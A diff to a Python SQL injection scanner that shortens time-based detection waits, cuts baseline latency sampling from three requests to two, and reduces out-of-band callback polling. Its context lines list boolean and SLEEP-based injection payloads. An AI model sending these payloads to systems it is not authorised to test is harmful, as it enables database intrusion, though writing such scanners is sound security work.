@@ -90,8 +90,8 @@ ERROR_PAYLOADS = [
 BOOLEAN_TRUE_PAYLOADS  = ["' OR '1'='1", "' OR 1=1--", "1 OR 1=1", '" OR "1"="1']
 BOOLEAN_FALSE_PAYLOADS = ["' OR '1'='2", "' OR 1=2--", "1 OR 1=2", '" OR "1"="2']
 
-SLEEP_SECONDS   = 6
-JITTER_TOLERANCE = 1.5  # seconds
+SLEEP_SECONDS   = 2
+JITTER_TOLERANCE = 0.8  # seconds
 
 TIME_PAYLOADS = {
     "mysql":    [f"' OR SLEEP({SLEEP_SECONDS})--", f"1; SELECT SLEEP({SLEEP_SECONDS})--"],
@@ -133,7 +133,7 @@ OOB_PAYLOADS = {
 # ─────────────────────────────────────────────────────────────────────────────
 
 INTERACTSH_SERVER = "https://oast.pro"
-INTERACTSH_POLL_WAIT = 8  # seconds to wait for async callbacks
+INTERACTSH_POLL_WAIT = 3  # seconds to wait for async callbacks
 
 
 class _InteractshClient:
@@ -435,14 +435,13 @@ class SQLiScanner:
         FIX vs original: flat 4.0s threshold caused false positives on slow
         endpoints. Now we measure the actual baseline latency first.
         """
-        # Measure baseline latency (3 requests)
+        # Measure baseline latency (2 requests — enough for median)
         baseline_times = []
-        for _ in range(3):
+        for _ in range(2):
             try:
                 t0 = time.time()
                 self.session.get(url, params=params, timeout=self.timeout)
                 baseline_times.append(time.time() - t0)
-                time.sleep(0.2)
             except Exception:
                 return None
 
@@ -459,7 +458,7 @@ class SQLiScanner:
                 try:
                     t0       = time.time()
                     self.session.get(url, params=test,
-                                     timeout=self.timeout + SLEEP_SECONDS + 5)
+                                     timeout=self.timeout + SLEEP_SECONDS + 2)
                     elapsed  = time.time() - t0
 
                     if elapsed >= threshold:
